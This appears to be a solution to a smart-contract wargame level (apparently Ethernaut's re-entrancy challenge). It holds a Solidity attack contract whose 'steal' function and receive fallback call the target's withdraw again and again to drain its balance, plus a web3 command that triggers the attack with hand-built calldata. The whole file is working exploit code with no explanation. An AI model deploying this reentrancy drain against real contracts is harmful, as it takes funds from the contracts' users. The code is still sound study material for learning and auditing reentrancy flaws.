// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface ReentranceInterface {
    function withdraw(uint) external ;
    function donate(address) external payable ;
}
contract Reentrance {
    function steal(address addr) public payable {
        ReentranceInterface(addr).donate{value:msg.value}(address(this));
        ReentranceInterface(addr).withdraw(msg.value);
    }
    receive() external payable {
        if (msg.sender.balance >= msg.value) {
            ReentranceInterface(msg.sender).withdraw(msg.value);
        } else if (msg.sender.balance > 0) {
            ReentranceInterface(msg.sender).withdraw(msg.sender.balance);
        }
    }
}

web3.eth.sendTransaction({from:player, to:"0x9a72E27c18f62cF50137eF3F8E3b6aD23fD15E77", data:web3.utils.sha3("steal(address)").slice(0,10)+"000000000000000000000000"+contract.address.slice(2),value:toWei(((await getBalance(contract.address))/10).toString())});


